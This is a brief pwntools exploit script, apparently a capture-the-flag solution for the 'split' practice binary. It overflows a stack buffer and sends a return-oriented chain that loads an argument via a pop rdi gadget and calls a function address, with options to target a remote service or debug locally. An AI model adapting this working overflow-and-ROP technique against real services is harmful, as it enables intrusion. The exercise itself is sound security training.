from pwn import *

elf = context.binary = ELF('./split')
context.terminal = ['tmux', 'splitw', '-h']
if args.REMOTE:
    conn = remote("", 10305)
elif args.GDB:
    conn = gdb.debug([elf.path], gdbscript='''
    b main
    ''')
else:
    conn = elf.process()

POP_RDI = p64(0x4007c3)  



#conn.send(cyclic(0x80))
conn.send(b'A'*40 + flat([POP_RDI, 0x601060])+ p64(0x40074B))
conn.interactive()